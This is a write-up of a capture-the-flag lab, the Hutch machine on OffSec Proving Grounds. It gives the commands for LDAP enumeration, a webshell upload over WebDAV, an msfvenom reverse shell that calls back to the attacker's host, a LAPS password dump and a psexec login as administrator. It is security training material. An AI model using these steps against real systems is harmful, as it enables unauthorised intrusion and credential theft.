---
layout: post
title: Hutch - Proving Grounds
date: 31-01-2025
categories: [Writeups]
tag: [Proving Grounds, Active Directory, Intermediate]
---

# Hutch - Walkthrough

Hutch is an intermediate box on OFFSECâ€™s Proving Grounds, the community rates Hutch as a hard difficulty box. 

- [Hutch - Walkthrough](#hutch---walkthrough)
  - [Recon](#recon)
  - [Enumeration](#enumeration)
  - [Exploitation](#exploitation)
  - [Privilege Escalation](#privilege-escalation)


## Recon
Start scanning all ports:
```
nmap -p- 192.168.234.122 -T 5 -v
```
![Scan de todas as portas](/assets/images/Hutch/1.png)

Scanning only the open doors we found:

```
nmap -sC -sV -Pn 192.168.234.122 -p 53,80,88,135,139,389,445,464,593,636,3268,3269,9389,49666,49667,49673,49674,49676,49692,49768  -v 
```

![Scan portas abertas](/assets/images/Hutch/2.png)

## Enumeration
I accessed port 80 and was unsuccessful, so I used ldapsearch to try to get information. <br>
I found usernames and among the usernames obtained, one of them had the login and password in clear text:
*fmcsorley:CrabSharkJellyfish192*

```
ldapsearch -v -x -b "DC=hutch,DC=offsec" -H "ldap://192.168.234.122" "(objectclass=*)"

# Freddy McSorley, Users, hutch.offsec
dn: CN=Freddy McSorley,CN=Users,DC=hutch,DC=offsec
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Freddy McSorley
description: Password set to CrabSharkJellyfish192 at users request. Please c
 hange on next login.
distinguishedName: CN=Freddy McSorley,CN=Users,DC=hutch,DC=offsec
instanceType: 4
whenCreated: 20201104053505.0Z
whenChanged: 20210216133934.0Z
uSNCreated: 12831
uSNChanged: 49179
name: Freddy McSorley
objectGUID:: TxilGIhMVkuei6KplCd8ug==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 132489437036308102
lastLogoff: 0
lastLogon: 132579563744834908
pwdLastSet: 132489417058152751
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAARZojhOF3UxtpokGnWwQAAA==
accountExpires: 9223372036854775807
logonCount: 2
sAMAccountName: fmcsorley
sAMAccountType: 805306368
userPrincipalName: fmcsorley@hutch.offsec
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=hutch,DC=offsec
dSCorePropagationData: 20201104053513.0Z
dSCorePropagationData: 16010101000001.0Z
lastLogonTimestamp: 132579563744834908
msDS-SupportedEncryptionTypes: 0
```

The nmap scan showed that there was a webdav running on port 80, so I used cadaver to test the credentials obtained to log in to the webdav

```
cadaver http://192.168.198.122
```
![cadaver](/assets/images/Hutch/3.png)

I accessed the web page which showed that IIS uses asp.net.
![iis](/assets/images/Hutch/4.png)

## Exploitation
Kali has an aspx webshell called cmdasp.aspx in the directory */usr/share/webshells/aspx/* <br>
Since I was able to log in using the credentials in the cadaver, I used curl to upload the webshell to the server.
```
curl -v http://192.168.198.122/ -u fmcsorley:CrabSharkJellyfish192 --upload-file cmdasp.aspx
```

![uploadwebshell](/assets/images/Hutch/5.png)

After uploading the webshell, I created a reverse shell with msfvenom

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.162 LPORT=4444 -f exe > rev.exe                                                      
```
![reverse](/assets/images/Hutch/6.png)

I uploaded the reverse shell using curl
```
curl -v http://192.168.198.122/ -u fmcsorley:CrabSharkJellyfish192 --upload-file rev.exe    
```
![curlshell](/assets/images/Hutch/7.png)

In the webshell, I navigated to the default IIS directory c:\inetpub\wwwroot and verified that the reverse shell file was there

![webshell](/assets/images/Hutch/8.png)

I started a listener on my host to get the connection:
```
nc -lnvp 4444
```
And I ran the reverse shell using the command:
```
start c:\inetpub\wwwroot\rev.exe
```

![webshell1](/assets/images/Hutch/9.png)

I got the reverse shell, navigated to the directory *C:\Users\fmcsorley\Desktop* where I got the flag local.txt

![local](/assets/images/Hutch/10.png)


## Privilege Escalation

Exploring the host, I noticed that it had the LAPS service installed:

![laps](/assets/images/Hutch/11.png)

I looked up how to get the passwords generated by laps through a ldap query, so I ran the code below to get the administrator's password:

```
ldapsearch -x -H "ldap://192.168.198.122" -D "hutch\fmcsorley" -w "CrabSharkJellyfish192" -b "dc=hutch,dc=offsec" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
```
![ldappass](/assets/images/Hutch/12.png)

I got the password *!IWACY$+QCn76+* which I used to log in as administrator using psexec:

```
impacket-psexec hutch.offsec/administrator:'!IWACY$+QCn76+'@192.168.198.122 
```

I browsed to the administrator's desktop and got the proof.txt flag:

![proof](/assets/images/Hutch/13.png)
